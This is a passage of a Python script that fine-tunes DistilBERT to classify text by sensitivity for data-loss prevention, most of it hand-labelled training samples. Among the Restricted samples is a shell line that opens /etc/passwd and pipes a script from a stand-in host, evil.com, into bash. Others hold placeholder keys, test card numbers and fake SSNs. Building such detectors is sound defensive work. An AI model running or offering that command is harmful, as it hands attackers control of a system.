"""
============================================================
DLP DistilBERT Fine-tuning — FINAL v5
============================================================
============================================================
"""

import os
import re
import json
import torch
import random
import hashlib
import unicodedata
import numpy as np
import pandas as pd
from pathlib import Path
from collections import Counter
from torch.utils.data import Dataset
from transformers import (
    AutoTokenizer,
    AutoModelForSequenceClassification,
    TrainingArguments,
    Trainer,
    EarlyStoppingCallback,
    TrainerCallback,
)
from sklearn.metrics import classification_report, confusion_matrix
from sklearn.model_selection import StratifiedShuffleSplit


# ── CONFIG ────────────────────────────────────────────────────────────────
BASE_MODEL   = "distilbert-base-uncased"
SAVE_PATH    = "ai/models/finetuned_distilbert"
CSV_PATH     = "ai/training_data/full_dataset.csv"
LOG_PATH     = "ai/models/training_log.json"
HOLDOUT_PATH = "ai/holdout_test.json"
LABELS       = ["Public", "Internal", "Confidential", "Restricted"]
LABEL2ID     = {l: i for i, l in enumerate(LABELS)}
ID2LABEL     = {i: l for i, l in enumerate(LABELS)}
MAX_LENGTH   = 128
MAX_PER_HF_DATASET = 400

TARGET_FLOOR = 300
TARGET_CEIL  = 450   # applied per-class; Public uses its real count (see balance_dataset)

KAGGLE_PII_CSV      = "ai/kaggle/pii_dataset/pii_dataset.csv"
KAGGLE_EMAIL_CSV    = "ai/kaggle/email_classification/SMS_train.csv"
KAGGLE_SPAM_CSV     = "ai/kaggle/spam_ham/spam_ham_dataset.csv"
KAGGLE_ENRON_CSV    = "ai/kaggle/enron/emails.csv"
SYENTHETIC_DATA_JSON = "ai/synthetic_data.json"



# ══════════════════════════════════════════════════════════════════════════
# SECTION 1 — DATA CLEANING
# ══════════════════════════════════════════════════════════════════════════

def clean_text(text: str) -> str:
    if not isinstance(text, str):
        return ""
    text = unicodedata.normalize("NFKC", text)
    text = re.sub(r"<[^>]+>", " ", text)
    text = re.sub(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]", "", text)
    text = re.sub(r"[ \t]+", " ", text)
    text = re.sub(r"\n{3,}", "\n\n", text)
    return text.strip()

def text_fingerprint(text: str) -> str:
    normalized = re.sub(r"\s+", " ", text.lower().strip())
    return hashlib.md5(normalized.encode()).hexdigest()

def deduplicate(data: list) -> list:
    seen, result = set(), []
    for text, label in data:
        fp = text_fingerprint(text)
        if fp not in seen:
            seen.add(fp)
            result.append((text, label))
    return result

def filter_length(data: list, min_len=15, max_len=512) -> list:
    return [(t, l) for t, l in data if min_len <= len(t) <= max_len]

def validate_labels(data: list) -> list:
    valid = set(LABELS)
    bad = [(t, l) for t, l in data if l not in valid]
    if bad:
        print(f"    WARNING: dropping {len(bad)} samples with invalid labels")
    return [(t, l) for t, l in data if l in valid]

def clean_dataset(data: list, source_name: str = "") -> list:
    before = len(data)
    data = [(clean_text(t), l) for t, l in data]
    data = [(t, l) for t, l in data if t]
    data = filter_length(data)
    data = validate_labels(data)
    data = deduplicate(data)
    after = len(data)
    tag = f"[{source_name}] " if source_name else ""
    print(f"    {tag}Cleaned: {before} -> {after} ({before - after} removed)")
    return data


# ══════════════════════════════════════════════════════════════════════════
# SECTION 2 — MANUAL TRAINING DATA
# All holdout examples removed. No duplicates.
# ══════════════════════════════════════════════════════════════════════════


MANUAL_DATA = [

    # ── PUBLIC ────────────────────────────────────────────────────────────
    ("Hi team, the birthday party is tomorrow at 3pm in the break room.",                     "Public"),
    ("Please find the attached press release for Q3 earnings.",                               "Public"),
    ("The company picnic is scheduled for Saturday. All employees are welcome.",               "Public"),
    ("Our new product launches next Monday. See the marketing brochure attached.",            "Public"),
    ("The cafeteria menu for this week is attached.",                                         "Public"),
    ("Please review the updated office parking policy.",                                      "Public"),
    ("The annual report is now publicly available on our website.",                           "Public"),
    ("Reminder: the building will be closed on Friday for maintenance.",                      "Public"),
    ("Our new mobile app is available now on iOS and Android.",                               "Public"),
    ("Join us at the industry conference next month. Register at our website.",               "Public"),
    ("We are pleased to announce our partnership with GlobalTech.",                           "Public"),
    ("Check out our latest blog post on cloud security trends.",                              "Public"),
    ("The company will be closed on December 25th for the holiday.",                          "Public"),
    ("New feature announcement: dark mode is now available in the app.",                      "Public"),
    ("We are hiring! Check out open positions at careers.company.com.",                       "Public"),
    ("Version 3.2 release notes: bug fixes and performance improvements.",                    "Public"),
    ("Congratulations to the sales team for hitting 120 percent of quota!",                   "Public"),
    ("Our new office in Dubai opens next month.",                                             "Public"),
    ("Our sustainability report for 2023 is now available for download.",                     "Public"),
    ("Customer case study: how ACME reduced costs by 30 percent using our platform.",         "Public"),
    ("POST /contact HTTP/1.1\nContent: name=Jane&email=jane@co.com&msg=Hello team",          "Public"),
    ("feedback=Great+product+love+the+new+dashboard+feature&rating=5",                       "Public"),
    ("search=product+features&category=software&page=1",                                     "Public"),
    ("Press release: company achieves record revenue for fiscal year 2024.",                  "Public"),
    ("Newsletter: top stories from the past month at our company.",                           "Public"),
    ("Public FAQ document for the newly launched enterprise tier.",                           "Public"),
    ("We welcome you to our annual customer conference. Agenda is attached.",                 "Public"),
    ("Product demo video now available on our YouTube channel.",                              "Public"),
    ("Sign up for our free trial at trial.company.com. No credit card required.",            "Public"),
    ("IT helpdesk will be unavailable Saturday 8am to 12pm for scheduled maintenance.",      "Public"),
    ("We are pleased to welcome three new members to our board of directors.",               "Public"),
    ("Our executive team will present at the investor conference on Tuesday.",               "Public"),
    ("The company has appointed a new Chief Marketing Officer effective January 1st.",       "Public"),
    ("GET /careers HTTP/1.1\nHost: company.com\nAccept: text/html",                         "Public"),
    ("GET /products/catalog HTTP/1.1\nHost: shop.company.com\nAccept: application/json",    "Public"),
    ("GET /home HTTP/1.1\nHost: company.com\nUser-Agent: Chrome/120",                       "Public"),
    ("GET /blog/latest HTTP/1.1\nHost: company.com\nAccept: text/html",                     "Public"),
    ("name=Alice+Brown&subject=Partnership+Inquiry&message=We+would+like+to+learn+more",    "Public"),
    ("POST /contact HTTP/1.1\nHost: company.com\nname=Bob&email=bob@gmail.com&message=Hello","Public"),
    ("GET /products/list HTTP/1.1\nHost: shop.company.com\nAccept: application/json",       "Public"),
    ("Your request has been received. Our support team will contact you shortly.",           "Public"),
    ("We have received your inquiry. Someone from our team will follow up soon.",            "Public"),
    ("Thank you for getting in touch. A member of our team will be with you soon.",          "Public"),
    ("Your ticket has been opened. Expected response time is one business day.",             "Public"),

    # FIX 7 — office/building closed for holiday (Public, not Confidential)
    ("The office will be closed on Monday for the national holiday. Regular hours resume Tuesday.", "Public"),
    ("Please note the office is closed this Friday in observance of the public holiday.",   "Public"),
    ("All offices will be closed on Thursday and Friday for the Thanksgiving holiday.",     "Public"),
    ("The building will be closed on Monday. Enjoy the long weekend!",                      "Public"),
    ("Reminder: offices are closed tomorrow for the bank holiday. See you Wednesday.",      "Public"),
    ("Company offices will be closed December 24–26 for the Christmas holiday period.",     "Public"),

    # FIX 8 — support acknowledgment replies (Public, not Internal)
    ("Thank you for contacting support. A representative will respond within 24 hours.",    "Public"),
    ("We have received your support request. Our team will be in touch shortly.",           "Public"),
    ("Your message has been received. A support agent will follow up with you soon.",       "Public"),
    ("Thanks for reaching out. We will get back to you within one business day.",           "Public"),
    ("Your inquiry has been logged. Expect a response from our team by end of day.",        "Public"),
    ("Support ticket created. Reference number: #58291. We will be in touch soon.",         "Public"),

    # ── INTERNAL ──────────────────────────────────────────────────────────
    ("Attached is the internal roadmap for Q4. Please do not share externally.",              "Internal"),
    ("Team meeting notes from yesterday's standup are attached.",                             "Internal"),
    ("Please review the updated org chart before the all-hands meeting.",                     "Internal"),
    ("Internal only: the new salary bands have been approved by HR.",                         "Internal"),
    ("Project Phoenix kickoff is scheduled for next week. Internal attendees only.",          "Internal"),
    ("The attached document contains our internal KPIs for this quarter.",                    "Internal"),
    ("For internal use only: draft of the new employee handbook.",                            "Internal"),
    ("Internal memo: IT will perform system maintenance this weekend.",                       "Internal"),
    ("Please keep this budget summary confidential within the department.",                   "Internal"),
    ("Attached is the internal competitive analysis. Do not distribute.",                     "Internal"),
    ("Internal: updated vacation policy effective January 1st.",                              "Internal"),
    ("Team retrospective notes from last sprint. Internal use only.",                         "Internal"),
    ("Internal pricing strategy for enterprise accounts. Do not share with clients.",         "Internal"),
    ("IT helpdesk internal procedures for handling escalations.",                             "Internal"),
    ("Internal security awareness training materials for employees.",                         "Internal"),
    ("Draft internal newsletter for Q4. Pending approval before distribution.",               "Internal"),
    ("Internal audit checklist for ISO 27001 compliance review.",                            "Internal"),
    ("Employee onboarding guide. Internal processes and system access.",                      "Internal"),
    ("Internal: department budget vs actuals for Q3. Management review only.",                "Internal"),
    ("Meeting minutes from internal strategy session. Not for client distribution.",          "Internal"),
    ("Internal escalation matrix for customer support team.",                                 "Internal"),
    ("Staff directory with internal extensions and office locations.",                        "Internal"),
    ("Preliminary internal findings from product quality review.",                            "Internal"),
    ("Internal memo: new expense reporting policy effective next month.",                     "Internal"),
    ("This document is for internal circulation only. Do not forward outside the company.",  "Internal"),
    ("Internal use: Q2 headcount plan and hiring targets by department.",                     "Internal"),
    ("Forwarding the internal system architecture diagram. Not for client sharing.",          "Internal"),
    ("Please treat the attached project timeline as internal.",                               "Internal"),
    ("Internal: updated security policies following last month's audit findings.",            "Internal"),
    ("Draft proposal for internal restructuring of the ops team.",                           "Internal"),
    ("This is an internal report summarizing helpdesk ticket volumes for the quarter.",      "Internal"),
    ("Not for external distribution: internal benchmark results comparing vendor products.", "Internal"),
    ("IT change management log, internal reference only.",                                    "Internal"),
    ("Internal wiki update: new runbook for on-call rotation procedure.",                     "Internal"),
    ("Internal budget forecast for FY2025. Shared with department heads only.",              "Internal"),
    ("Team leads meeting recap, internal. Please do not distribute.",                         "Internal"),
    ("Attached is the internal service desk escalation policy. For staff use only.",          "Internal"),
    ("Internal HR update: changes to remote work policy effective next month.",               "Internal"),
    ("INVOICE #4521\nBill To: Acme Corp\nServices: Q3 Consulting Roadmap\nAmount: 45,000\nInternal reference: Project Falcon", "Internal"),
    ("PURCHASE ORDER 8821\nVendor: TechSupplies\nItems: 50 laptops\nTotal: 87,500\nInternal deployment only", "Internal"),
    ("MEETING MINUTES Internal\nDate: November 12\nAttendees: Engineering\nTopics: Sprint planning\nAction: Deploy v2.1 by Friday", "Internal"),
    ("POST /intranet/upload HTTP/1.1\nHost: internal.company.com\nfilename=org_chart_2024.pptx", "Internal"),
    ("POST /sharepoint/upload\nfilename=budget_draft.xlsx\nInternal use only",               "Internal"),
    ("Internal product review notes from the engineering leadership team.",                   "Internal"),
    ("Updated internal org chart following the recent team restructuring.",                   "Internal"),
    ("Internal only: summary of vendor negotiations and shortlisted suppliers.",              "Internal"),
    ("Internal reference: compliance checklist for data handling procedures.",                "Internal"),
    ("Internal customer success playbook, not for sharing with clients.",                     "Internal"),
    ("Please review this internal proposal before the board meeting on Friday.",             "Internal"),
    ("Not to be shared externally: internal audit results for Q3.",                          "Internal"),
    ("Internal escalation: customer complaint forwarded to executive team for review.",       "Internal"),
    # FIX 6 (v5): Internal examples using words that previously triggered Confidential
    ("The revised travel expense policy is now attached. Please review before your next trip.", "Internal"),
    ("All staff must submit timesheets by Thursday. Payroll runs Friday morning.",            "Internal"),
    ("POST /sharepoint/docs HTTP/1.1\nfilename=q3_headcount_plan.xlsx\nInternal HR planning.", "Internal"),
    ("Internal escalation: the outage has been escalated to the on-call engineer.",          "Internal"),
    ("Please review the attached draft agenda for next week's all-hands meeting.",           "Internal"),
    ("Reminder to all staff: the new expense tool goes live on Monday. Review the guide.",   "Internal"),
    ("IT notice: VPN certificates are being renewed this weekend. No action required.",      "Internal"),
    ("Please review the revised procurement policy attached. Effective next quarter.",       "Internal"),
    ("Uploading Q2 sales plan to SharePoint. For internal team use only.",                   "Internal"),
    ("All project leads must log hours in Jira before the Friday payroll cutoff.",           "Internal"),
    ("The attached onboarding checklist has been updated. HR will distribute to new hires.", "Internal"),
    ("Internal draft: proposed changes to the on-call rotation. Please review and comment.", "Internal"),
    ("POST /sharepoint/upload\nfilename=sales_targets_H2.xlsx\nInternal sales planning.",    "Internal"),
    ("A leadership review of divisional structure has been initiated. Not for general circulation.", "Internal"),

    # FIX 9 — targeted Internal examples for the 3 remaining holdout failures:
    # Pattern A: "travel policy attached" (routine ops, not Confidential)
    ("The updated employee travel policy is attached for your reference. Please read before booking.", "Internal"),
    ("Attached is the revised business travel policy effective next quarter. Internal use only.", "Internal"),
    ("HR has updated the travel reimbursement policy. Attached for staff reference.",        "Internal"),
    ("Please find the attached travel expense policy update. Submit claims using the new form.", "Internal"),
    ("Internal: the attached policy covers travel booking procedures for all staff.",        "Internal"),
    # Pattern B: "submit timesheets / payroll Friday" (routine ops, not Confidential)
    ("Staff reminder: submit timesheets by end of day Friday. Payroll processes over the weekend.", "Internal"),
    ("Please remember to submit your hours by Thursday. The payroll run is Friday morning.", "Internal"),
    ("Reminder: timesheet submission deadline is today. Payroll closes at 5pm.",            "Internal"),
    ("All staff must log hours before Friday noon for payroll processing.",                  "Internal"),
    ("Payroll reminder: submit your timesheet by end of day or payment may be delayed.",    "Internal"),
    ("HR reminder: Friday is the payroll cutoff. Please ensure timesheets are approved.",   "Internal"),
    # Pattern C: "draft of internal communication / attached draft" (routine ops, not Confidential)
    ("Please review the attached draft of the internal communication plan for Q4.",         "Internal"),
    ("Draft of the internal announcement is attached. Feedback welcome before Friday.",     "Internal"),
    ("Attached is a draft of the internal memo regarding the office relocation.",           "Internal"),
    ("Here is the draft of the internal newsletter. Please review and return comments.",    "Internal"),
    ("Internal draft communication attached. Review before we send to all staff.",          "Internal"),
    # Extra reinforcement: "policy attached" in plain operational contexts
    ("The attached leave policy has been updated following the HR review.",                  "Internal"),
    ("Attached is the revised IT acceptable use policy. All staff must acknowledge receipt.", "Internal"),
    ("Please review the attached draft of the internal escalation policy for support.",     "Internal"),
    ("Internal: the data retention policy attached has been approved by legal.",            "Internal"),
    ("Attached draft covers changes to the internal procurement approval policy.",          "Internal"),

    # ── CONFIDENTIAL — obvious ────────────────────────────────────────────
    ("The merger with AcmeCorp is planned for Q1. The board has not been informed yet.",      "Confidential"),
    ("This document contains the terms of the acquisition agreement. Strictly confidential.","Confidential"),
    ("Client contract attached. Contains pricing and SLA details. Confidential.",             "Confidential"),
    ("The litigation strategy document is attached. Attorney-client privileged.",             "Confidential"),
    ("Salary review outcomes for the engineering department. Confidential.",                  "Confidential"),
    ("Attached is the draft patent application. Do not disclose before filing.",              "Confidential"),
    ("Personnel file including performance reviews and disciplinary notes.",                   "Confidential"),
    ("The attached NDA covers all discussions regarding Project Falcon.",                     "Confidential"),
    ("Layoff plan: 15 percent workforce reduction in Q1. HR and executives only.",           "Confidential"),
    ("Pending lawsuit settlement: 4.5 million agreed. Do not disclose before signing.",      "Confidential"),
    ("Board resolution to approve stock buyback of 500 million. Pre-announcement.",          "Confidential"),
    ("Attorney-client privileged: legal opinion on regulatory exposure in EU markets.",      "Confidential"),
    ("Trade secret: manufacturing process for new battery technology. Do not share.",        "Confidential"),
    ("Security audit findings: 3 critical vulnerabilities in production infrastructure.",    "Confidential"),
    ("Whistleblower complaint filed against CFO regarding financial misreporting.",          "Confidential"),
    ("Competitor pricing intelligence gathered from undercover market research.",             "Confidential"),
    ("Severance agreement for CEO transition. Confidential until public announcement.",      "Confidential"),
    ("M&A term sheet with binding exclusivity clause. Parties: ACME and GlobalTech.",       "Confidential"),
    ("Termination letter for Michael Torres effective December 31st. HR confidential.",      "Confidential"),
    ("Draft earnings release showing EPS miss of 0.34. Embargoed until Friday.",            "Confidential"),
    ("INVOICE 9921\nClient: AcmeCorp\nServices: M&A Due Diligence\nAmount: 220,000\nNote: Confidential. Project Falcon.", "Confidential"),
    ("POST /upload HTTP/1.1\nHost: wetransfer.com\nfilename=Q4_merger_strategy_FINAL.docx\nAcquisition details must remain confidential until board approval.", "Confidential"),
    ("filename=layoff_plan_Q1.docx\n15 percent workforce reduction. HR eyes only.",          "Confidential"),
    ("The reorganization proposal covers reporting lines across three business units. Executive only.", "Confidential"),
    ("Proposed changes to team structure are attached for board review. Embargoed until announcement.", "Confidential"),
    ("The proposed org restructuring affects the product and engineering divisions. For leadership only.", "Confidential"),
    ("Attached is the proposed reorganization plan. Three reporting lines will change next quarter.", "Confidential"),
    ("The divisional restructure proposal is ready for board review. Not for general circulation.", "Confidential"), 
    ("Net loss EGP 2.3M. Merger planned. Board unaware.",                    "Confidential"),
    ("Revenue declined 18 percent. Board not yet informed.",                  "Confidential"),
    ("Quarterly loss reported. Merger announcement pending.",                 "Confidential"),
    ("Financial projections show deficit. Executive eyes only.",              "Confidential"),
    ("Net income down 34 percent. Do not share before earnings call.",        "Confidential"),
    ("Operating loss this quarter. Embargoed until Friday announcement.",     "Confidential"),
    ("Profit warning issued internally. Not for public disclosure.",          "Confidential"),
    ("Revenue miss confirmed. Board briefing scheduled for Monday.",          "Confidential"),
    ("EPS below guidance. Announcement embargoed until market close.",        "Confidential"),
    ("Cash flow negative this quarter. Confidential — executives only.",      "Confidential"),

    # ── MERGER AND ACQUISITION (short forms) ──────────────────────────────
    ("Merger with AcmeCorp. Board unaware. Strictly confidential.",          "Confidential"),
    ("Acquisition target identified. Due diligence begins Monday.",           "Confidential"),
    ("Deal signed. Announcement scheduled for next Tuesday. Embargoed.",      "Confidential"),
    ("Term sheet agreed. Not for distribution outside deal team.",            "Confidential"),
    ("M&A discussions ongoing. Board approval pending. Confidential.",        "Confidential"),
    ("Takeover bid prepared. Market sensitive. Do not disclose.",             "Confidential"),
    ("Merger negotiations active. Counterparty unaware of our valuation.",    "Confidential"),
    ("Strategic acquisition planned. Regulatory filing not yet made.",        "Confidential"),
    ("Joint venture terms agreed. Confidential until signing.",               "Confidential"),
    ("Buyout offer prepared. Price embargoed. Executive team only.",          "Confidential"),

    # ── INSIDER-RISK PHRASES ──────────────────────────────────────────────
    # These short phrases are high DLP risk — board unaware = pre-announcement
    ("Board has not been informed yet.",                                      "Confidential"),
    ("Do not share before the public announcement.",                          "Confidential"),
    ("Market sensitive information. Restricted distribution.",                "Confidential"),
    ("Pre-announcement. Embargoed until official press release.",             "Confidential"),
    ("Not for distribution outside the executive committee.",                 "Confidential"),
    ("This is insider information. Handle with strict confidentiality.",      "Confidential"),
    ("Undisclosed material information. Distribution strictly controlled.",   "Confidential"),
    ("Non-public financial information. Authorized recipients only.",         "Confidential"),

    # ── FINANCIAL + EGYPTIAN CONTEXT ──────────────────────────────────────
    ("خسارة صافية 2.3 مليون جنيه. خطة الاندماج قيد التنفيذ. للبورد بس",    "Confidential"),
    ("تراجع الإيرادات 18 بالمئة. للإدارة العليا فقط. لا يُعلن",             "Confidential"),
    ("توقعات مالية سلبية للربع القادم. سري للغاية. لمجلس الإدارة بس",      "Confidential"),
    ("الاستحواذ على شركة جديدة. المجلس لم يُبلَّغ بعد. سري",               "Confidential"),
    ("خسارة تشغيلية هذا الربع. محجوز حتى إعلان النتائج الرسمي",            "Confidential"),

    # ── ADDITIONAL GENERAL CONFIDENTIAL (reinforce the class) ─────────────
    ("This document is strictly confidential and for authorized eyes only.",  "Confidential"),
    ("Confidential: do not forward, copy, or distribute this message.",       "Confidential"),
    ("The information in this email is privileged and confidential.",         "Confidential"),
    ("Strategic plan attached. Confidential. Not for external circulation.",  "Confidential"),
    ("Personnel decision pending announcement. Keep strictly confidential.",  "Confidential"),
    ("Regulatory filing not yet submitted. Pre-public information inside.",   "Confidential"),
    ("This pricing information is competitively sensitive. Confidential.",    "Confidential"),
    ("Workforce restructuring decision. HR and executives only.",             "Confidential"),
    ("Sensitive negotiation in progress. Do not discuss outside this group.", "Confidential"),
    ("Board resolution pending. Confidential until ratified.",                "Confidential"),
    ("Attached are the financial projections for the next three quarters. Please review before Thursday's meeting.", "Confidential"),
    ("The revenue model has been updated to reflect two downside scenarios. See attached for details.",              "Confidential"),
    ("A summary of the proposed transaction has been prepared for the steering committee.",                          "Confidential"),
    ("The document outlines potential cost reduction measures affecting two business units.",                        "Confidential"),
    ("Please review the attached personnel assessment for the regional director before Friday.",                     "Confidential"),
    ("The board presentation for the upcoming session covers three strategic options for the division.",             "Confidential"),
    ("This memo outlines the key findings from the external review of our financial reporting processes.",           "Confidential"),
    ("Updated headcount reduction scenarios are attached for the executive team to review.",                         "Confidential"),
    ("The preliminary analysis of the proposed joint venture is attached for your review.",                          "Confidential"),
    ("Revised earnings estimates are attached for the CFO review prior to the analyst call.",                        "Confidential"),
    ("The deal team has prepared an overview of the target company liabilities for committee review.",               "Confidential"),
    ("A draft of the proposed leadership transition plan is attached. Please review and comment.",                   "Confidential"),
    ("The legal team has prepared a summary of the regulatory risks associated with the expansion.",                 "Confidential"),
    ("The attached document covers the proposed terms for the senior executive separation package.",                 "Confidential"),
    ("Please review the options analysis prepared for the investment committee meeting.",                            "Confidential"),
    ("This document summarizes the outcome of the third-party investigation into the finance function.",             "Confidential"),
    ("Attached is the benchmarking analysis of executive compensation across comparable organizations.",             "Confidential"),
    ("The restructuring memo outlines changes to three reporting lines effective next quarter.",                     "Confidential"),
    ("A revised forecast showing a shortfall versus plan has been prepared for leadership review.",                  "Confidential"),
    ("The IP transfer agreement covering the new product line is ready for final legal review.",                     "Confidential"),
    ("Attached: proposed settlement framework. Parties have agreed in principle. Awaiting signatures.",              "Confidential"),
    ("The financing proposal for the facility expansion has been shared with the transaction committee.",            "Confidential"),
    ("This document contains the equity grant schedule for the new executive team members.",                         "Confidential"),
    ("A summary of the data breach impact assessment has been prepared for the board.",                              "Confidential"),
    ("The vendor selection rationale and final pricing are attached for procurement committee review.",              "Confidential"),
    ("Please review the attached draft proxy materials ahead of the shareholder meeting.",                           "Confidential"),
    ("This report covers three proposed responses to the regulators inquiry. Legal review pending.",                 "Confidential"),
    ("The go-forward plan for the underperforming division is attached for leadership discussion.",                  "Confidential"),
    ("A financial summary of the acquisition target has been prepared for the deal team.",                           "Confidential"),
    ("The attached analysis covers the tax implications of the proposed corporate restructuring.",                   "Confidential"),
    ("This memo summarizes the outcome of salary negotiations with the two senior candidates.",                      "Confidential"),
    ("Updated risk assessment for the government contract has been prepared for executive review.",                  "Confidential"),
    ("The proposal covers our strategic response to the competitor recent product launch.",                          "Confidential"),
    ("Attached is the initial term sheet for the partnership arrangement. Not yet signed.",                          "Confidential"),
    ("This document covers the proposed allocation of equity in the new joint venture structure.",                   "Confidential"),

    # ── RESTRICTED ────────────────────────────────────────────────────────
    ("Patient John Doe, DOB 1985-04-12, prescribed metformin 500mg. BP: 140/90.",            "Restricted"),
    ("Credit card number: 4111 1111 1111 1111, CVV: 123, Expiry: 12/26",                    "Restricted"),
    ("SSN: 123-45-6789. Employee record attached including full PII.",                       "Restricted"),
    ("API_KEY=sk-prod-9f2k DB_PASSWORD=admin123 HOST=internal-db.company.local",             "Restricted"),
    ("SELECT * FROM customers; full table dump including card_number and billing_address",   "Restricted"),
    ("Private key: BEGIN RSA PRIVATE KEY MIIEowIBAAKCAQEA",                                 "Restricted"),
    ("Patient admitted with chest pain. EKG shows ST elevation. ICD-10: I21.0",             "Restricted"),
    ("SWIFT transfer: IBAN DE89370400440532013000 Amount: EUR 450,000",                     "Restricted"),
    ("Biometric data export: fingerprint hashes for 1,200 employees attached.",             "Restricted"),
    ("Social Security Number 123-45-6789 found in employee records.",                       "Restricted"),
    ("Full credit card dump: PAN, CVV, expiry, billing zip for 5000 customers.",            "Restricted"),
    ("Medical record: HIV positive diagnosis, antiretroviral therapy initiated.",            "Restricted"),
    ("Database backup containing plaintext passwords for all user accounts.",                "Restricted"),
    ("AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI K7MDENG bPxRfiCYEXAMPLEKEY",                    "Restricted"),
    ("Patient SSN 987-65-4321, insurance ID 88234, admitted for cardiac surgery.",          "Restricted"),
    ("Wire transfer: routing 021000021, account 8675309, amount 250,000 dollars.",          "Restricted"),
    ("Employee payroll file: bank account numbers, routing numbers, net salaries.",         "Restricted"),
    ("HIPAA breach: 3,400 patient records including diagnosis codes and medications.",      "Restricted"),
    ("Prescription: oxycodone 10mg, DEA number AB1234563, patient DOB 1978-03-15.",        "Restricted"),
    ("Employee ID 8842, NPI 1234567890, diagnosis: Type 2 Diabetes, HbA1c 8.2",           "Restricted"),
    ("Routing number 021000021, account 778899001, payroll transfer 12,400 dollars",       "Restricted"),
    ("VISA card: 4532 1488 0343 6467 exp 09/28 CVV 341 billing zip 10001",                 "Restricted"),
    ("chmod 777 /etc/passwd; curl http://evil.com/shell.sh | bash",                        "Restricted"),
    ("POST /upload HTTP/1.1\nHost: dropbox.com\nfilename=customer_db_export.csv\nFields: customer_id, credit_card, cvv, billing_address, ssn", "Restricted"),
    ("filename=patient_records.xlsx\nSSN, DOB, diagnosis, medication for 3400 patients",   "Restricted"),
    ("POST /api/upload\nAWS_KEY=AKIAIOSFODNN7EXAMPLE\nSECRET=wJalrXUtnFEMI",              "Restricted"),
    ("cardNumber=4111111111111111&cvv=123&expiry=12/26&amount=500",                         "Restricted"),
    ("ssn=123-45-6789&dob=1985-04-12&firstName=John&lastName=Doe&insurance=BC123",         "Restricted"),
    ("username=admin&password=Sup3rS3cr3t&db=production&host=db.internal.com",             "Restricted"),
    ("From: john@company.com\nTo: personal@gmail.com\nSubject: files\nAttaching customer database.\nFields: name, email, credit_card, billing_address", "Restricted"),
    ("PRESCRIPTION\nPatient: Sarah Johnson DOB: 03/15/1990\nMedication: Adderall XR 20mg\nDEA: AB1234563\nDr. Smith MD", "Restricted"),
    ("Source code repository dump including proprietary trading algorithms.",                "Restricted"),
    ("Leaked source code containing proprietary trading algorithm logic.",                   "Restricted"),
    ("DB_HOST=prod-db.internal\nDB_USER=root\nDB_PASS=Xk9!mP2\nDB_NAME=customers_prod",   "Restricted"),
    ("SELECT customer_id, card_number, cvv, expiry FROM payments WHERE status='active'",   "Restricted"),
    ("Export of user table: id, email, password_hash, credit_card_last4, billing_address", "Restricted"),
    ("Payroll export: employee_id, full_name, bank_routing, account_number, net_salary",   "Restricted"),
    ("Biometric export request: face embeddings and fingerprint templates for 800 staff",  "Restricted"),
    ("DB_PASSWORD=admin123\nSECRET_KEY=xK9m\nAPI_TOKEN=prod-live-abc123\nHOST=db.internal","Restricted"),
    ("SELECT ssn, dob, salary, bank_account FROM employees WHERE department='engineering'","Restricted"),
    ("Environment config: STRIPE_KEY=sk_live_abc SENDGRID_KEY=SG.xyz DB_URL=postgres://admin:pass@db", "Restricted"),
    ("Table dump: users — columns: user_id, email, password_hash, ssn, date_of_birth, credit_card", "Restricted"),
    ("kubectl get secret prod-credentials -o yaml — contains base64 encoded DB passwords","Restricted"),
    ("name=John+Smith&email=john%40gmail.com&message=Hello+I+would+like+more+info&subject=Inquiry", "Public"),
    ("firstname=Alice&lastname=Brown&company=ACME&phone=555-1234&interest=enterprise", "Public"),
    ("search=product+features&category=software&page=1&sort=relevance", "Public"),
    ("feedback=Great+product&rating=5&recommend=yes&comment=Very+easy+to+use", "Public"),
    ("newsletter_signup=true&email=user%40example.com&frequency=weekly", "Public"),
    ("contact_form=1&subject=Partnership+Inquiry&body=We+are+interested+in+partnering", "Public"),

    # HTTP GET requests — public endpoints
    ("GET /products/catalog HTTP/1.1\nHost: shop.company.com\nAccept: application/json", "Public"),
    ("GET /about-us HTTP/1.1\nHost: company.com\nUser-Agent: Mozilla/5.0 Chrome/120", "Public"),
    ("GET /blog/cloud-security-trends HTTP/1.1\nHost: company.com\nAccept: text/html", "Public"),
    ("GET /api/v1/products?category=software&limit=20 HTTP/1.1\nHost: api.company.com", "Public"),

    # JSON — public API responses
    ('{"status": "success", "message": "Your inquiry has been received", "ticket_id": "TKT-1234"}', "Public"),
    ('{"products": [{"id": 1, "name": "Enterprise Suite", "price": 999}], "total": 1}', "Public"),
    ('{"event": "product_launch", "date": "2024-03-15", "venue": "Cairo Convention Center"}', "Public"),

    # HTML form — contact / registration
    ('<form action="/contact"><input name="name" value="John"><input name="email" value="j@gmail.com"></form>', "Public"),
    ('<form method="POST"><input type="text" name="company"><input type="email" name="contact_email"></form>', "Public"),

    # ── INTERNAL — web content ────────────────────────────────────────────
    # Intranet uploads
    ("POST /intranet/upload HTTP/1.1\nHost: internal.company.com\nContent-Type: multipart/form-data\nfilename=org_chart_2024.pptx\nFor internal use only — do not share externally", "Internal"),
    ("POST /sharepoint/docs/upload HTTP/1.1\nfilename=q3_team_update.docx\nContent: Internal team update for Q3. Management review only.", "Internal"),
    ("POST /confluence/wiki/page HTTP/1.1\nTitle: Sprint Retrospective Notes\nContent: Internal team retrospective. Do not share with clients.", "Internal"),
    ("POST /jira/issue HTTP/1.1\n{\"summary\": \"Update internal deployment procedure\", \"description\": \"Internal runbook update\", \"priority\": \"Medium\"}", "Internal"),

    # Internal JSON payloads
    ('{"type": "internal_memo", "to": "all_staff", "subject": "New expense policy", "body": "Internal use only. Effective next month.", "distribution": "internal"}', "Internal"),
    ('{"meeting": "sprint_planning", "attendees": ["team_leads"], "notes": "Internal only — not for client distribution", "date": "2024-Q3"}', "Internal"),
    ('{"report_type": "headcount", "quarter": "Q3", "classification": "internal", "do_not_distribute": true}', "Internal"),

    # URL-encoded — internal systems
    ("action=update&document=budget_draft_q4&classification=internal&distribute=no&recipients=management_only", "Internal"),
    ("upload_type=internal&filename=org_restructure_plan.xlsx&access=restricted_internal&notify=team_leads", "Internal"),

    # ── CONFIDENTIAL — web content ────────────────────────────────────────
    # Cloud uploads of confidential documents
    ("POST /upload HTTP/1.1\nHost: wetransfer.com\nContent-Type: multipart/form-data\nfilename=Q4_merger_strategy_FINAL.docx\nThe acquisition of TechCorp must remain confidential until board approval.", "Confidential"),
    ("POST /drive/upload HTTP/1.1\nHost: drive.google.com\nfilename=board_presentation_Q3_confidential.pptx\nContent: Revenue projections and M&A targets. Board eyes only.", "Confidential"),
